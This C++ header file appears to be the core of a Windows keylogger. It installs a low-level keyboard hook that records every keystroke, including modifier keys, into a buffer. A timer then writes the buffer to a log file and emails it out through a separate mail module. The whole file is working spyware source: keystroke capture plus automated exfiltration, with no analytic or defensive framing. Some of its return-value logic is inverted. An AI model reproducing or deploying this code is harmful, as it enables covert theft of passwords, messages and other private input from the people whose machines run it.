#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog = "";

void TimerSendMail()
{
    if (keylog.empty())
        return;
    std::string lastFile = IO::WriteLog(keylog);

    if (lastFile.empty())
    {
        Helper::WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");
        return;
    }

    int result = Mail::SendMail(
        "Log [" + lastFile + "]",
        "Hi :)\nThe file has been attached to this mail :)\nFor testing, enjoy:\n" + keylog,
        IO::GetOurPath(true) + lastFile);

    if (result != 7)
        Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(result));
    else
        keylog = "";
}

Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite);

HHOOK eHook = nullptr;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if (nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if (kbs->vkCode == VK_RETURN)
            keylog += '\n';
    }
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if (key == VK_CONTROL ||
            key == VK_LCONTROL ||
            key == VK_RCONTROL ||
            key == VK_SHIFT ||
            key == VK_RSHIFT ||
            key == VK_LSHIFT ||
            key == VK_MENU ||
            key == VK_LMENU ||
            key == VK_RMENU ||
            key == VK_CAPITAL ||
            key == VK_NUMLOCK ||
            key == VK_LWIN ||
            key == VK_RWIN)
        {
            std::string keyName = Keys::KEYS[kbs->vkCode].Name;
            keyName.insert(1, "/");
            keylog += keyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook started... Timer Started");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(
        WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(nullptr), 0);

    return eHook == nullptr;
}

bool UnistallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = nullptr;
    return (bool)b;
}

bool IsHooked()
{
    return eHook == nullptr;
}

#endif // KEYBHOOK_H
